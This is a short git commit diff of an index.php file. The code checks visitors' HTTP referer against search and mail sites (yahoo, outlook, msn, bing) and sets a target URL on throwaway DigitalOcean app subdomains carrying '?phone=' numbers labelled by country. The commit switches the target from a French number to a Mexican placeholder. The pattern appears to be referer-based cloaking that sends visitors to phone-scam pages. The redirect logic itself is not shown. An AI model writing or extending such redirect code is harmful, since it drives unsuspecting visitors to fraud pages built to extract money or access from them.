04dbb2295ec0e10e5a4c4f96ada696ffe477af72
luisdomain88 <147002646+luisdomain88@users.noreply.github.com>
2023-11-17 19:18:59 +0100

    Update index.php

--- index.php
+++ index.php
@@ -8,9 +8,8 @@
     $referers_bing=array('yahoo','outlook','msn','becovi','bing');
 
     $lanzar=true;
-   //$dominio_m='urchin-app-ykwwi.ondigitalocean.app/?phone=910-971-803'; //es 910
-   // $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=919-610-587'; //es 919
-   $dominio_m='whale-app-z8c92.ondigitalocean.app/?phone=01-87-65-31-10'; // fr 919
+    
+    $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=xxxxxxxxxx'; //mexique
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
